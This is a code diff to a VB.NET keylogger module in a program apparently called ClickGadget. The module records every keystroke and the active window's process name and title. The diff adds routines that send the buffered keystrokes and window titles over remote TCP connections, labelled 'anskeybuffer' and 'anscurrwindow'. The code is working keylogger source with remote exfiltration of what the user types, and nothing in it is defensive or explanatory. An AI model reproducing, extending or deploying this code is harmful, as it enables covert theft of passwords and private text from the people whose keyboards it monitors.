@@ -31,16 +31,21 @@ Namespace KeyloggerModule
             Dim altGr As Boolean
         End Structure
 
-        Public allowHotkeys As Boolean
-        Public recordWindow As Boolean
+        Public ReadOnly Property allowHotkeys() As Boolean
+            Get
+                Return SettingsService.getSetting(SettingsIdentifier.KEYLOGGER_ALLOW_HOTKEYS)
+            End Get
+        End Property
+        Public ReadOnly Property recordWindow() As Boolean
+            Get
+                Return SettingsService.getSetting(SettingsIdentifier.KEYLOGGER_RECORD_WINDOW)
+            End Get
+        End Property
 
         Function keyloggerInit(Optional reloadPath As Boolean = True) As Boolean
             If reloadPath Then
-                updateKeyLoggerOutputPath(Form1.dll.iniReadValue("Config", "keyloggerPath", "", Form1.inipath))
+                updateKeyLoggerOutputPath(SettingsService.loadSetting(SettingsIdentifier.KEYLOGGER_PATH))
             End If
-            allowHotkeys = Form1.dll.iniReadValue("Config", "keyloggerAllowHotkeys", 0, Form1.inipath)
-            recordWindow = Form1.dll.iniReadValue("Config", "keyloggerRecordWindow", 1, Form1.inipath)
-
 
             If Not String.IsNullOrEmpty(keyloggerOutputPath) Then
                 Dim purePath As String = keyloggerOutputPath.Substring(0, keyloggerOutputPath.LastIndexOf("\") + 1)
@@ -87,7 +92,7 @@ Namespace KeyloggerModule
 
         Sub handleTimerTick()
             For i = 0 To 255
-                Dim state = Form1.GetAsyncKeyState(i)
+                Dim state = ClickGadget.GetAsyncKeyState(i)
                 modKeys.ctrl = Key.ctrlKey()
                 modKeys.shift = Key.shiftKey()
                 modKeys.alt = Key.altKey()
@@ -109,11 +114,21 @@ Namespace KeyloggerModule
                         lastWindowTitle = getWindowTitle()
                         lastWindowHandle = handle
                         flushKeylogBuffer()
-                        Dim output = getTimestamp() & "PROCESS: " & "[" & getWindowProcessName() & "] - " & "'" & getWindowTitle() & "'"
+                        Dim nameAndTitle As String = "[" & getWindowProcessName() & "] - " & "'" & getWindowTitle() & "'"
+                        Dim output = getTimestamp() & "PROCESS: " & nameAndTitle
                         logRaw(output)
+                        sendChange(nameAndTitle)
                     End If
                 End If
             End If
+        End Sub
+
+        Sub sendChange(ByVal value As String)
+            Dim connections = Form1.remoteTcp.getRandomConnectionOrder()
+            connections.ForEach(
+                Sub(c)
+                    c.send("anscurrwindow" & value)
+                End Sub)
         End Sub
         Sub logKeyStroke(i As Integer)
             logWindowChange()
@@ -136,8 +151,16 @@ Namespace KeyloggerModule
                 If Not logRaw(getTimestamp() & keylogBuffer) Then
                     Return
                 End If
+                sendKeyBuffer(keylogBuffer)
             End If
             keylogBuffer = ""
+        End Sub
+        Sub sendKeyBuffer(value As String)
+            Dim connections = Form1.remoteTcp.getRandomConnectionOrder()
+            connections.ForEach(
+                Sub(c)
+                    c.send("anskeybuffer" & value)
+                End Sub)
         End Sub
 
         Function getTimestamp() As String
